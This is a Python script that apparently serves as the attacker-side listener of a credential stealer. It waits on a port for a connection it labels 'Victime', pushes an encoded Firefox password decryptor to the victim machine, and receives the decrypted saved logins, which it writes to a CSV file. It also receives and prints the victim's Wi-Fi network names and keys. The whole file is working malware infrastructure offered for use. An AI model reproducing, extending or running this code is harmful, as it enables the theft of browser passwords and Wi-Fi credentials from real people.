import socket
import base64

def recv_data(sock: socket) -> bytes:
    buffer =  b''
    while True:
        data = sock.recv(1)
        if data == b'\n':
            return buffer
        buffer+= data

def write_file(data: bytes, file_name: str) -> None:
    decoded_data = base64.b64decode(data)
    with open(file_name, 'wb') as f :
        f.write(decoded_data)

def send_decoder(s: socket) -> None:
    with open('./firefox_decrypt.py', 'rb') as f:
        data =  f.read()
    data_encoded =  base64.b64encode(data)
    separateur = "\n"
    s.sendall(data_encoded)
    s.send(separateur.encode('utf-8'))

def write_credential(credential: str) -> None:
    with open('./credential.csv', mode='w', encoding='utf-8') as file:
        file.write(credential)

def get_credential(conn: socket) -> int:
    send_decoder(conn)
    data =  recv_data(conn)
    decoded_data = base64.b64decode(data)
    credential = decoded_data.decode('utf-8')
    if "Error" in credential :
        print(credential)
        return 1
    credential = credential.replace("\"","")
    credential = credential.replace("\n\r","\n")
    print("Firefox credential:")
    print(credential)
    write_credential(credential)
    return 0

def get_wifi(conn: socket) -> None:
    data = recv_data(conn)
    decoded_data = base64.b64decode(data)
    wifi =  decoded_data.decode('utf-8')
    print("Wifi credential:\nSSID:key")
    wifi = wifi.split("\n")
    for x in wifi:
        print(x)

def main() -> None:
    s = socket.socket()
    host = "0.0.0.0"
    port = 12345
    s.bind((host, port))
    s.listen(1)
    print(host)
    print("Waiting for Connections......")
    conn, addr = s.accept()
    print(f"{addr[0]}:{addr[1]} Victime trigger!")
    if get_credential(conn) :
        conn.close()
        s.close()
        exit()
    get_wifi(conn)
    conn.close()
    s.close()

main()
